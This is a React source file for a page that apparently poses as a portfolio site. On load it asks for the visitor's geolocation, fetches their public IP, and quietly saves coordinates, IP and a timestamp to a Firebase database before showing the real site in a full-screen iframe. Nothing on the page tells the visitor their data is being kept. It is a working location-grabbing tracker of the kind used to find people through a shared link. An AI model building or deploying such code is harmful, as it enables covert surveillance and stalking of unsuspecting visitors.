import React, { useEffect, useState } from 'react';
import { db } from './firebase';
import { ref, push } from 'firebase/database';
import axios from 'axios';

function App() {
  const [showSite, setShowSite] = useState(false); // Control when to show iframe
  const [status, setStatus] = useState("wait for load...");

  useEffect(() => {
    const collectAndStoreLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          setStatus("Location granted. Collecting data...");

          const { latitude, longitude } = pos.coords;

          try {
            const res = await axios.get('https://api.ipify.org?format=json');
            const ip = res.data.ip;

            const data = {
              latitude,
              longitude,
              ip,
              timestamp: new Date().toISOString(),
            };

            await push(ref(db, 'users'), data);

            setStatus("Data saved. Loading site...");
            setTimeout(() => setShowSite(true), 1000); // Delay before loading site
          } catch (error) {
            console.error("Error collecting IP or pushing to Firebase", error);
            setStatus("Something went wrong.");
          }
        },
        (err) => {
          setStatus("Location access denied.");
          console.error("Geolocation error:", err);
        });
      } else {
        setStatus("Geolocation not supported.");
      }
    };

    collectAndStoreLocation();
  }, []);

  return (
    <div style={{ height: '100vh', overflow: 'hidden', backgroundColor: '#000', color: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
      {showSite ? (
        <iframe
          src="https://alan-protfio.netlify.app"
          title="User Site"
          width="100%"
          height="100%"
          style={{ border: 'none' }}
        />
      ) : (
        <h2 style={{ animation: "pulse 2s infinite" }}>{status}</h2>
      )}

      {/* Pulse animation */}
      <style>{`
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.4; }
          100% { opacity: 1; }
        }
      `}</style>
    </div>
  );
}

export default App;
